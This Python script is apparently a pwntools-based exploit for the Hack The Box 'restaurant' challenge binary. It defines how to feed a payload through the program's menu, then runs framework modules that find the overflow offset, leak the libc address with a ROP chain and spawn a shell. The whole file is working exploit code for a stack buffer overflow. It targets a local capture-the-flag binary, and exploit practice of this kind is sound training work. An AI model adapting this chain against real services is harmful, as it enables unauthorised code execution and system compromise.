import pathlib
from core.target_config import Config, Mode
from core.targetbase import TargetBase
from modules.find_offset import FindOffset
from modules.get_libc_address import GetLibcAddress
from modules.exec_shell import ExecShell
from loguru import logger
from pwnlib.tubes.process import process
from abstract.pwntarget import PwnTarget


class RestaurantPwn(PwnTarget):
    @classmethod
    def main(cls, proc: process, payload: bytes, *args, **kwargs):
        print(proc.clean(timeout=0.5).decode())
        proc.sendline(b"1")
        print(proc.clean(timeout=0.3).decode())
        proc.send_raw(payload)

    @classmethod
    def input_handler(cls, proc: process, payload: bytes, *args, **kwargs):
        pos = payload.find(b'\0')
        expected = b'Enjoy your '
        if pos >= 0:
            expected += payload[:pos]
        else:
            expected += payload
        proc.recvline()
        data = proc.recv(len(expected))
        if data != expected:
            logger.warning("Input handler: received and expected data mismatch")

if __name__ == '__main__':
    config = Config(
        rop=True,
        mode=Mode.local,
        file=pathlib.Path('/home/lim8en1/htb/projects-archive/restaurant/pwn_restaurant/restaurant'),
        offset=0x28,
        detect_libc=True
    )

    t = TargetBase(pwn_target=RestaurantPwn, config=config)
    FindOffset.execute(t, config.offset_max)
    if GetLibcAddress.execute(t):
        ExecShell.execute(t)
